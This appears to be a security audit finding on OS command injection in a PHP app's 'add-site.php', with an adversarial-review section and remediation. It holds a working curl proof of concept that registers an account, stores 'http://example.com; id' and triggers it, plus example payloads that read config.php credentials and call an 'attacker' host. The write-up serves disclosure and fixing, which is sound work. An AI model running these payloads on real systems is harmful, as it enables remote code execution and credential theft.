# Vulnerability: OS Command Injection (RCE) — stored site URL passed to `shell_exec()`

## Summary
`user/add-site.php` stores an attacker-supplied `url` in `tbl_sites` and later concatenates
it into the shell command `"time curl -I " . $site`, executed via `shell_exec()` (`:15-16`).
No quoting/escaping is applied and the WAF does not filter shell metacharacters. Any
low-privileged authenticated user (open registration) can store a URL such as
`http://x; id` and trigger `?ping=1&id=<n>` to execute arbitrary OS commands as the
web-server user. The same primitive provides SSRF.

## Confidence
High — found by both taint directions and survived all three adversarial attacks with a
fully cited path.

## Authentication Requirement
Authenticated (Low Privilege) — any self-registered user. The `ping` DB lookup is by `id`
only (`:14`), with no `user_id` scoping, so any authenticated user can trigger any stored
site row.

## Attack Surface Location
- **Endpoint:** `POST /user/add-site.php` (store) → `GET /user/add-site.php?ping=1&id=<n>` (trigger)
- **Handler:** `user/add-site.php:13-18` (sink), `:20-22` (source/store)
- **Framework protections bypassed:** AumWAF (`libs/AumWAF.class.php:34-45`) blocks only
  `sqlmap/acunetix/nessus/bot/scan/zap/parros/injector`; `;`, `|`, `$()`, backticks and `&`
  are not filtered. `get()/post()` are raw (`libs/common.php:24-50`).

## Attack Chain
1. **Initial access:** self-register and log in, obtaining `PHPSESSID`.
2. **Endpoint interaction:** POST a URL to `/user/add-site.php` to store it.
3. **Malicious input:** `url=http://example.com; id` (shell separator; no single quote so
   the raw INSERT at `:21` succeeds).
4. **Sink execution:** `GET /user/add-site.php?ping=1&id=1` reads the stored URL (`:14`) and
   runs `time curl -I http://example.com; id` via `/bin/sh -c` in `shell_exec()` (`:15-16`).
5. **Post-exploitation:** command output is captured and rendered in the "Ping Result" panel
   (`:17`, `templates/user/add-site.php:53-65`), giving a non-blind RCE channel.
6. **Final impact:** remote code execution as `www-data` (plus secondary SSRF via `curl`).

## Data Flow
- **Source (user input):** POST `url` (`user/add-site.php:21`).
- **Sink:** `shell_exec($cmd)` (`user/add-site.php:16`).

```
post('url') → INSERT INTO tbl_sites (user_id, url) [user/add-site.php:21] → tbl_sites.url
get('id') → intval → SELECT ... url [user/add-site.php:14] → $site
  → "time curl -I " . $site [user/add-site.php:15] → shell_exec() [user/add-site.php:16]
```

## Proof of Concept

### Prerequisites
- A valid low-privilege session (open registration).

### Exploit Request
```bash
T='http://{{TARGET_HOST}}'
curl -s -c /tmp/cj.txt -d 'usermail=atk@evil.com&username=atk&p1=pass123&p2=pass123' "$T/user/register.php"
curl -s -c /tmp/cj.txt -b /tmp/cj.txt -d 'email=atk@evil.com&password=pass123' "$T/user/login.php"
# Store the injected URL
curl -s -b /tmp/cj.txt --data-urlencode 'url=http://example.com; id' "$T/user/add-site.php"
# Trigger the shell sink (site id = 1 for a fresh account)
curl -s -b /tmp/cj.txt "$T/user/add-site.php?ping=1&id=1"
```

### Expected Vulnerable Response
The Ping Result panel contains the injected command output, e.g.:
```html
<div class="well">... uid=33(www-data) gid=33(www-data) groups=33(www-data) ...</div>
```

### Expected Patched Response
The URL is validated/escaped (`escapeshellarg` / `filter_var(..., FILTER_VALIDATE_URL)`), so
`; id` is treated as part of the host and no injected command output appears.

### Impact Demonstration
`url=http://x; cat /var/www/html/config.php` discloses the DB credentials
(`config.php:5-8`); `url=http://x; curl http://attacker/...` or a reverse shell yields full
server compromise.

## Affected Code
```php
// user/add-site.php:13-18
if( get('ping') ) {
	$site = $mysqli->query("SELECT * FROM tbl_sites WHERE id = " . intval(get('id')))->fetch_object()->url;
	$cmd = "time curl -I " . $site;
	$out = shell_exec($cmd);
	$smarty->assign('cmdout', nl2br($out));
}
```
```php
// user/add-site.php:20-22
if(isPost()) {
	$mysqli->query("INSERT INTO tbl_sites (user_id, url) VALUES ('" . cookie('user_id') . "', '" . post('url') . "')");
}
```

## Adversarial Review
Independent reviewer: `security_reviewer_adversary` (did not author this finding).

- **Reachability attack — FAILED to kill.** `add-site.php:4` requires only `isAuth()`, which
  open registration satisfies; `post('url')` is stored verbatim at `:21` and read unmodified
  at `:14`; the `?ping` branch is reached at `:13`.
- **Impact attack — FAILED to kill.** `shell_exec()` runs `/bin/sh -c` on unescaped input
  (`:16`) and returns the output to the attacker (`:17`); RCE is in scope.
- **Validity attack — FAILED to kill.** Only `id` is `intval`-cast (`:14`); `$site` is
  concatenated unescaped (`:15`); no `escapeshellarg`/allow-list; the WAF has no
  shell-metacharacter signature.

**Verdict: SURVIVED** (all three attacks failed).

## Remediation
Never pass user data to a shell. Use a PHP HTTP client with an SSRF guard (block
private/loopback/link-local/metadata ranges), or at minimum `escapeshellarg($site)` plus
`filter_var($url, FILTER_VALIDATE_URL)` and an allow-list of schemes/hosts. Scope the lookup
to the caller (`AND user_id = <session id>`) and parameterize the SQL.
